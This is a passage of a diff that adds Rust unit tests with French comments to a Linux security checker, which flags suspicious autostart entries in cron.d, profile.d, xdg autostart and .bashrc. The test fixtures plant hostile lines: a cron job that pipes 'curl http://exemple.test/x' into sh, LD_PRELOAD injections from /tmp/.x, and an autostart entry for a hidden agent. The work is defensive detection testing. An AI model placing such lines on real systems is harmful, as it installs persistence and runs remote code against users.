         assert_eq!((t.suspects.len(), t.informations.len()), (0, 1), "{:?}", t.suspects);
         assert!(t.informations[0].contains("à root seul"), "{:?}", t.informations);
+    }
+
+    /// Ronde 4 du lot 096 (G5-1) : ce dont rien ne se lance ni ne se pose ne lève pas le bilan. Un lien vers /dev/null
+    /// masque le fichier (vide par construction : `lire_borne` refuse le périphérique), un fichier à la place d'un
+    /// dossier du chemin (ENOTDIR) rend le chemin impossible, un sous-dossier de /etc/cron.d n'est pas lu par cron.
+    /// Avant, chacun levait « illisible, non vérifié », ÉLEVÉ. Témoin : le même ~/.bashrc en mode 000 reste levé.
+    #[test]
+    fn rien_a_lire_ne_leve_pas() {
+        use std::os::unix::fs::PermissionsExt as _;
+        for (i, cas) in [
+            "bashrc masqué",
+            "cron.d masqué",
+            "fish en fichier",
+            "sous-dossier de cron.d",
+        ]
+        .into_iter()
+        .enumerate()
+        {
+            let m = Maison::nouvelle(&format!("rien-a-lire-{i}"));
+            match cas {
+                "bashrc masqué" => std::os::unix::fs::symlink("/dev/null", m.chemin(".bashrc")).unwrap(),
+                "cron.d masqué" => {
+                    let d = m.racine.join("etc/cron.d");
+                    std::fs::create_dir_all(&d).unwrap();
+                    std::os::unix::fs::symlink("/dev/null", d.join("masque")).unwrap();
+                }
+                "fish en fichier" => m.ecrire(".config/fish", "pas un dossier\n"),
+                _ => {
+                    let d = m.racine.join("etc/cron.d/sous");
+                    std::fs::create_dir_all(&d).unwrap();
+                    std::fs::write(d.join("x"), "* * * * * root curl http://exemple.test/x | sh\n").unwrap();
+                }
+            }
+            let c = m.lancements();
+            assert_eq!(c.probleme, None, "{cas} : {}", c.message);
+        }
+        let m = Maison::nouvelle("rien-a-lire-temoin");
+        m.ecrire(".bashrc", "echo bonjour\n");
+        std::fs::set_permissions(m.chemin(".bashrc"), std::fs::Permissions::from_mode(0o000)).unwrap();
+        if std::fs::read(m.chemin(".bashrc")).is_ok() {
+            return crate::essais::saute("un fichier en mode 000 se lit ici (root ou « unshare -r »)");
+        }
+        let c = m.lancements();
+        assert_eq!(c.probleme, Some(Niveau::Eleve), "{}", c.message);
+        assert!(c.message.contains("~/.bashrc : illisible ("), "{}", c.message);
+    }
+
+    /// Ronde 4 du lot 096 (G5-3) : un DOSSIER de démarrage ou de configuration présent qui ne s'ouvre pas n'est jamais
+    /// un bilan vert. Avant, /etc/cron.d ou /etc/profile.d en mode 000, une ligne piégée dedans, rendaient « Aucun
+    /// lancement automatique suspect » : `read_dir` raté donnait une liste vide. Ici, sous la racine d'essai (pas à
+    /// root seul), chacun est levé ; témoin : le même dossier ouvert, sa ligne piégée est levée. Sous root ou
+    /// « unshare -r », un dossier en 000 s'ouvre quand même : l'essai le dit sauté.
+    #[test]
+    fn dossier_ferme_jamais_vert() {
+        use std::os::unix::fs::PermissionsExt as _;
+        for (i, (dossier, fichier, ligne)) in [
+            ("etc/cron.d", "maj", "* * * * * root curl http://exemple.test/x | sh\n"),
+            ("etc/profile.d", "x.sh", "export LD_PRELOAD=/tmp/.x/l.so\n"),
+            (
+                "etc/xdg/autostart",
+                "x.desktop",
+                "[Desktop Entry]\nType=Application\nExec=/tmp/.x/agent\n",
+            ),
+        ]
+        .into_iter()
+        .enumerate()
+        {
+            let m = Maison::nouvelle(&format!("dossier-ferme-{i}"));
+            m.ecrire_hors(&format!("/{dossier}/{fichier}"), ligne);
+            let d = m.racine.join(dossier);
+            let ouvert = m.lancements();
+            assert_eq!(
+                ouvert.probleme,
+                Some(Niveau::Eleve),
+                "{dossier} ouvert : {}",
+                ouvert.message
+            );
+            std::fs::set_permissions(&d, std::fs::Permissions::from_mode(0o000)).unwrap();
+            if std::fs::read_dir(&d).is_ok() {
+                return crate::essais::saute("un dossier en mode 000 s'ouvre ici (root ou « unshare -r »)");
+            }
+            let c = m.lancements();
+            std::fs::set_permissions(&d, std::fs::Permissions::from_mode(0o755)).unwrap();
+            assert_eq!(c.probleme, Some(Niveau::Eleve), "{dossier} fermé : {}", c.message);
+            assert!(
+                c.message.contains(&format!("{dossier} ne se lit pas (")),
+                "{dossier} fermé : {}",
+                c.message
+            );
+        }
+    }
+
+    /// Ronde 4 du lot 096 (R4-5) : un lien d'un nom cherché (/etc/profile.d/x.sh) dont la cible est dans un dossier
+    /// fermé n'est plus sauté sans un mot : le shell, en root, le suit ; ici, il est levé « ne se lit pas ». Témoins :
+    /// le dossier ouvert, la ligne piégée de la cible est levée elle-même ; la cible retirée (lien mort), rien de dit
+    /// sur ce lien. Sous root ou « unshare -r », un dossier en 000 s'ouvre quand même : l'essai le dit sauté.
+    #[test]
+    fn lien_vers_une_cible_cachee_dit() {
+        use std::os::unix::fs::PermissionsExt as _;
+        let m = Maison::nouvelle("lien-cible-cachee");
+        m.ecrire_hors("/opt/cache/x.sh", "export LD_PRELOAD=/tmp/.x/l.so\n");
+        let ferme = m.racine.join("opt/cache");
+        std::fs::create_dir_all(m.racine.join("etc/profile.d")).unwrap();
+        let lien = m.racine.join("etc/profile.d/x.sh");
+        std::os::unix::fs::symlink(ferme.join("x.sh"), &lien).unwrap();
+        let dit = "profile.d/x.sh ne se lit pas (";
+        let ouvert = m.lancements();
+        assert_eq!(ouvert.probleme, Some(Niveau::Eleve), "{}", ouvert.message);
+        assert!(!ouvert.message.contains(dit), "{}", ouvert.message);
+        std::fs::set_permissions(&ferme, std::fs::Permissions::from_mode(0o000)).unwrap();
+        if std::fs::metadata(&lien).is_ok() {
+            std::fs::set_permissions(&ferme, std::fs::Permissions::from_mode(0o755)).unwrap();
+            return crate::essais::saute("un dossier en mode 000 se traverse ici (root ou « unshare -r »)");
+        }
+        let c = m.lancements();
+        std::fs::set_permissions(&ferme, std::fs::Permissions::from_mode(0o755)).unwrap();
+        assert_eq!(c.probleme, Some(Niveau::Eleve), "{}", c.message);
+        assert!(c.message.contains(dit), "{}", c.message);
+        std::fs::remove_file(ferme.join("x.sh")).unwrap();
+        let mort = m.lancements();
+        assert!(!mort.message.contains(dit), "{}", mort.message);
+    }
+
+    /// G5-3, la règle : un dossier fermé est levé une seule fois (déjà dit par la vérification de la maison, il ne se
+    /// répète pas) ; à root seul, une information ; absent ou impossible (ENOTDIR), rien.
+    #[test]
+    fn dossier_non_lu_selon_a_qui() {
+        let m = Maison::nouvelle("dossier-non-lu");
+        let refus = std::io::Error::from(std::io::ErrorKind::PermissionDenied);
+        let mut t = Lancements::default();
+        for e in [std::io::ErrorKind::NotFound, std::io::ErrorKind::NotADirectory] {
+            dossier_non_lu(&mut t, &m.chemin(".config/autostart"), &std::io::Error::from(e));
+        }
+        assert!(t.suspects.is_empty() && t.informations.is_empty());
+        dossier_non_lu(&mut t, &m.chemin(".config/autostart"), &refus);
+        dossier_non_lu(&mut t, &m.chemin(".config/autostart"), &refus);
+        assert_eq!((t.suspects.len(), t.informations.len()), (1, 0), "{:?}", t.suspects);
+        if !de_root_seul(Path::new("/etc")) {
+            return crate::essais::saute("/etc n'est pas à root seul ici (« unshare -r » ?)");
+        }
+        let mut t = Lancements::default();
+        dossier_non_lu(&mut t, Path::new("/etc"), &refus);
+        assert_eq!((t.suspects.len(), t.informations.len()), (0, 1), "{:?}", t.suspects);
+        assert!(
+            t.informations[0].contains("ce qu'il pose ou lance n'est pas vu"),
+            "{:?}",
+            t.informations
+        );
     }
 
     /// Ronde 3 du lot 096 (N4) : une ligne signalée qui porte un octet hors UTF-8 ne se désigne pas au fils root (il
@@ -19695,6 +20061,54 @@ mod tests {
             let auto = c.correctif.as_ref().is_some_and(|k| k.automatique);
             assert_eq!(auto, designable, "{lieu} {octets:?} : {}", c.message);
             assert_eq!(c.message.contains(phrase), !designable, "{}", c.message);
+        }
+    }
+
+    /// Ronde 4 du lot 096 (G34-1, R4-3), côté bilan : une ligne signalée qui finit par « \ », ou suit une telle
+    /// ligne, ou ouvre un heredoc, se lit liée à une autre ; le bilan n'en offre pas le retrait seul (le fils root le
+    /// refuserait aussi : `linux::retrait_decoupe`), le geste automatique tombe et la phrase « à la main » le dit.
+    /// Témoin : la même ligne sans « \ » garde son retrait.
+    #[test]
+    fn ligne_jointe_a_la_main() {
+        let phrase = "finit par « \\ »";
+        let piege = "export LD_PRELOAD=/tmp/.x/evil.so";
+        for (i, (contenu, jointe)) in [
+            (format!("{piege} \\\n/usr/local/bin/aide --installer\n"), true),
+            (format!("A=1 \\\n{piege}\n"), true),
+            (format!("{piege}; cat >/dev/null <<EOF\necho REVEILLEE\nEOF\n"), true),
+            (format!("{piege}\n/usr/local/bin/aide --installer\n"), false),
+        ]
+        .into_iter()
+        .enumerate()
+        {
+            let m = Maison::nouvelle(&format!("jointe-{i}"));
+            m.ecrire_hors("/etc/profile.d/x.sh", &contenu);
+            let c = m.lancements();
+            leve(&c, &contenu);
+            assert_eq!(c.message.contains(phrase), jointe, "{contenu:?} : {}", c.message);
+            let variable = |_: &str| -> Option<std::ffi::OsString> { None };
+            let mut t = Lancements {
+                r: releveur(&m.racine, &m.racine.join("home/alice"), &variable),
+                ..Lancements::default()
+            };
+            let f = m.racine.join("etc/profile.d/x.sh");
+            juger_configuration(
+                std::slice::from_ref(&f),
+                &[(f.clone(), Variables::Shell)],
+                &[],
+                &m.racine.join("home/alice"),
+                &mut t,
+            );
+            assert_eq!(t.jointes, jointe, "{contenu:?}");
+            assert_eq!(t.retraits.len(), 1, "{contenu:?}");
+            assert_eq!(t.retraits[0].is_some(), !jointe, "{contenu:?}");
+            let racine = m.racine.to_str().unwrap().to_string();
+            for r in t.retraits.iter_mut().flatten() {
+                r.0 = r.0.strip_prefix(&racine).unwrap().to_string();
+            }
+            let c = constat_des_lancements(t);
+            let auto = c.correctif.as_ref().is_some_and(|k| k.automatique);
+            assert_eq!(auto, !jointe, "{contenu:?} : {}", c.message);
         }
     }
 
